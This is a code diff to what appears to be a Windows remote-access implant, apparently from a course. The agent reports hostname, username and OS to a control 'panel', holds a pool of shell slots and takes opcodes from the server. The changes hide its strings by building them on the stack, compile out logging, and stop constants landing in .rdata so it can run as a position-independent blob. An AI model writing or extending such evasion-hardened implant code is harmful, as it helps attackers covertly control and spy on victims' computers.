@@ -70,13 +70,13 @@
 #include "logger.h"
 #include "kernel32.h"
 #include "entry.h"      /* agent_main: the -nostdlib entry contract */
+#include "stackstrings.h" /* C1 step 3b: functional strings built on the stack */
 
 
 /* Commit tag baked into the identity frame. CI overrides it with
  * -DAGENT_COMMIT_HASH="<8-char git hash>"; local builds keep the study tag. */
-#ifndef AGENT_COMMIT_HASH
-#define AGENT_COMMIT_HASH "course01"
-#endif
+/* CI passes -DAGENT_COMMIT_HASH="<8 hex chars>" AND -DAGENT_COMMIT_HASH_DEFINED;
+ * local builds fall back to a stack-built tag (a literal would sit in .rdata). */
 
 /* ==========================================================================
  * The identity frame (the reply to Hello)
@@ -95,7 +95,13 @@ static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
     write_u32_le(frame, &pos, STATUS_OK);            /* status = 0       */
     write_u32_le(frame, &pos, ID_API_VERSION);       /* API version = 5  */
     write_u32_le(frame, &pos, ID_AGENT_NAME_ID);     /* breed id = 1     */
+#ifdef AGENT_COMMIT_HASH_DEFINED
     write_ascii_field(frame, &pos, AGENT_COMMIT_HASH, ID_COMMIT_HASH_SIZE);
+#else
+    CHAR commit_buf[9];
+    StrCommitDefault(commit_buf);
+    write_ascii_field(frame, &pos, commit_buf, ID_COMMIT_HASH_SIZE);
+#endif
     write_u32_le(frame, &pos, ID_BUILD_NUMBER);      /* build number     */
 
     frame[pos++] = (unsigned char)(sizeof(void *) == 8 ? 1 : 0);  /* 64-bit */
@@ -107,9 +113,13 @@ static int build_identity_frame(unsigned char frame[IDENTITY_FRAME_SIZE],
 
     write_ascii_field(frame, &pos, facts->hostname,  ID_HOSTNAME_SIZE);
     write_ascii_field(frame, &pos, facts->username,  ID_USERNAME_SIZE);
+    CHAR arch64[4]; StrX64(arch64);
+    CHAR arch86[4]; StrX86(arch86);
     write_ascii_field(frame, &pos,
-                      sizeof(void *) == 8 ? "x64" : "x86", ID_ARCH_SIZE);
-    write_ascii_field(frame, &pos, "Windows",        ID_PLATFORM_SIZE);
+                      sizeof(void *) == 8 ? arch64 : arch86, ID_ARCH_SIZE);
+    CHAR platform_buf[8];
+    StrPlatformWindows(platform_buf);
+    write_ascii_field(frame, &pos, platform_buf, ID_PLATFORM_SIZE);
     write_ascii_field(frame, &pos, facts->os_version, ID_OS_VERSION_SIZE);
 
     write_u64_le(frame, &pos, CAPABILITY_MASK);      /* capability mask  */
@@ -144,8 +154,12 @@ static DWORD handle_hello(const agent_ctx *ctx, HINTERNET socket)
     if (err != NO_ERROR)
         return err;
     LOG_INFO("Identity sent to the panel (%d bytes)\n", frame_len);
+#ifdef LOGGING_ENABLED
     if (ctx->verbose)
         print_identity_frame(frame, frame_len);
+#else
+    (void)ctx;
+#endif
     return NO_ERROR;
 }
 
@@ -308,9 +322,16 @@ INT32 agent_main(INT32 argc, CHAR *argv[])
      * process globals - without a byte of .bss. */
     WCHAR url[2048];
     shell_slot shells[SHELL_POOL_SIZE];
-    const int backoff_steps[] = { 1, 2, 4, 8, 16, 32 };
-    const int backoff_count =
-        sizeof(backoff_steps) / sizeof(backoff_steps[0]);
+    /* C1 step 3b follow-up: an INITIALIZED frame array is still .rdata -
+     * the compiler pools the constants and memcpy's them in (caught live:
+     * the blob died reading the pooled {1,2,4,8,16,32}). Scalar writes only. */
+    int backoff_steps[6];
+    /* volatile WRITES (trap: scalar const-array init still pools into
+     * .rdata as one movdqu - seen live in the blob harness). Writing
+     * through a volatile pointer keeps each store an instruction. */
+    volatile int *bs = backoff_steps;
+    bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
+    const int backoff_count = 6;
     int backoff_pos = 0;
     agent_ctx ctx;
 
@@ -413,7 +434,9 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
            https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
     
 
-    session = winhttp.WinHttpOpen(L"minimal_agent/1.0",
+    WCHAR ua_buf[18];                     /* "minimal_agent/1.0" + NUL */
+    StrUserAgent(ua_buf);
+    session = winhttp.WinHttpOpen(ua_buf,
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
@@ -425,7 +448,9 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
      * UPGRADE option below, not by us. */
     DWORD request_flags = WINHTTP_FLAG_REFRESH;
     if (https) request_flags |= WINHTTP_FLAG_SECURE;   /* TLS for https */
-    request = winhttp.WinHttpOpenRequest(connection, L"GET", uc.lpszUrlPath, NULL,
+    WCHAR get_buf[4];
+    StrGetMethodW(get_buf);
+    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, request_flags);
     if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
@@ -476,8 +501,10 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             goto cleanup;             /* a close frame is also just a loss */
         }
 
+#ifdef LOGGING_ENABLED
         if (ctx->verbose)
             print_command(index, &msg);
+#endif
 
         unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
 
